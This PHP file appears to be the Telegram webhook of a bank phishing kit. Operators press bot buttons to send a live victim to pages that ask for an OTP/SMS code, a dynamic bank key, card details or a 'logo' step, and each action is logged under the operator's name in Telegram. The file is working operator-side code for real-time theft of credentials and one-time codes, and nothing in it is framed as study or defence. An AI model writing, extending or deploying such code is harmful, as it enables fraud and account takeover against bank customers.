<?php
// webhook.php

// Cargar configuración
$config = require __DIR__ . '/../config.php';

// Obtener la actualización de Telegram
$update = json_decode(file_get_contents('php://input'), true);

// Verificar si es una callback query
if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data  = explode(':', $callback_query['data']);

    $action         = $callback_data[0] ?? '';
    $transaction_id = $callback_data[1] ?? '';

    // Datos del mensaje original
    $message       = $callback_query['message'] ?? [];
    $chatId        = $message['chat']['id']      ?? null;
    $messageId     = $message['message_id']      ?? null;
    $originalText  = $message['text']           ?? '';

    // Usuario que hizo clic
    $from          = $callback_query['from'] ?? [];
    $username      = $from['username'] ?? ($from['first_name'] ?? 'Operador');
    // Agrega @ solo si es username
    $userLabel     = isset($from['username']) ? "@{$username}" : $username;

    // Iniciar sesión para almacenar el estado
    session_start();
    $_SESSION['current_transaction'] = $transaction_id;

    // Manejar diferentes acciones → también definimos un texto humano
    $accionHumana = 'Acción desconocida';
    $redirect_url = '';

    switch ($action) {
        case 'pedir_logo':
            $_SESSION['current_action'] = 'logo';
            $redirect_url = 'pedir_logo.php';
            $accionHumana = 'Solicitó NUEVO LOGO';
            break;

        case 'pedir_dinamica':
            $_SESSION['current_action'] = 'dinamica';
            $redirect_url = 'pedir_dinamica.php';
            $accionHumana = 'Pidió DINÁMICA';
            break;

        case 'pedir_otp':
            $_SESSION['current_action'] = 'otp';
            $redirect_url = 'pedir_otp.php';
            $accionHumana = 'Pidió OTP / SMS';
            break;

        case 'error_tc':
            $_SESSION['current_action'] = 'error_tc';
            $redirect_url = 'error_tc.php';
            $accionHumana = 'Marcó ERROR TARJETA';
            break;

        case 'error_logo':
            $_SESSION['current_action'] = 'error_logo';
            $redirect_url = 'error_logo.php';
            $accionHumana = 'Marcó ERROR DE LOGO';
            break;

        case 'tarjeta':
            $_SESSION['current_action'] = 'tarjeta';
            $redirect_url = 'tarjeta.php'; // ajusta si se llama distinto
            $accionHumana = 'Redirigir a TARJETA';
            break;

        case 'finalizar':
        case 'confirm_finalizar':
            $_SESSION['current_action'] = 'finalizado';
            $redirect_url = 'finalizar.php';
            $accionHumana = 'FINALIZÓ la operación';
            break;

        default:
            $accionHumana = 'Acción desconocida';
            $redirect_url = '';
    }

    // 👉 Editar el mensaje en Telegram para reflejar la acción + operador
    if ($chatId && $messageId && $originalText) {
        // Nuevo texto: mensaje original + bloque de estado
        $newText  = $originalText;
        $newText .= "\n\n————————————\n";
        $newText .= "✅ Acción: <b>{$accionHumana}</b>\n";
        $newText .= "👤 Operador: <b>{$userLabel}</b>";

        $editPayload = [
            'chat_id'    => $chatId,
            'message_id' => $messageId,
            'text'       => $newText,
            'parse_mode' => 'HTML',
            // Si quieres eliminar los botones después de pulsar:
            // 'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot" . $config['bot_token'] . "/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($editPayload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    // Responder a la callback query (para quitar el "loading..." en Telegram)
    $response_data = [
        'callback_query_id' => $callback_query['id'],
        'text'       => 'Procesando solicitud...',
        'show_alert' => false
    ];

    $ch = curl_init("https://api.telegram.org/bot" . $config['bot_token'] . "/answerCallbackQuery");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($response_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);

    // Guardar la URL de redirección en la sesión (por si la usas en tu panel)
    if (!empty($redirect_url)) {
        $_SESSION['redirect_url'] = $redirect_url;
    }
}

// Responder con OK
http_response_code(200);
echo "OK";
